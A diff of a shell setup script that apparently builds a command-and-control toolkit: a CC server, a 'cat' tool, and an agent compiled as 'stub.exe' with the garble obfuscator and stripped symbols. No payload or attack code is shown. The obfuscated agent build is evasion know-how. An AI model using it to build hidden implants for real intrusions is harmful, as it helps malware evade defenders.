@@ -5,15 +5,31 @@ if ! command -v tmux >/dev/null 2>&1; then
     exit 1
 fi
 
+command -v go || {
+    echo "You need to set up Go first"
+    exit 1
+}
+
+command -v garble || {
+    echo "Installing garble"
+    go install mvdan.cc/garble@latest || exit 1
+}
+
 tmux_conf="$PWD/tmux/.tmux.conf"
 [[ -f "$tmux_conf" ]] || {
     echo "$tmux_conf" not found
     exit 1
 }
 
+# build
+pwd="$(pwd)"
 [[ -f ./cc.exe ]] || (
     echo "[-] Building CC server as it's not found"
-    python3 ./build.py --target cc
+    cd cmd/cc && go build -o "$pwd/cc.exe"
+    cd "$pwd" &&
+        cd cmd/cat && go build -o "$pwd/cat.exe"
+    cd "$pwd" &&
+        cd cmd/agent && garble -literals -tiny build -o "$pwd/stub.exe" -ldflags='-s -w -v'
 )
 
 (
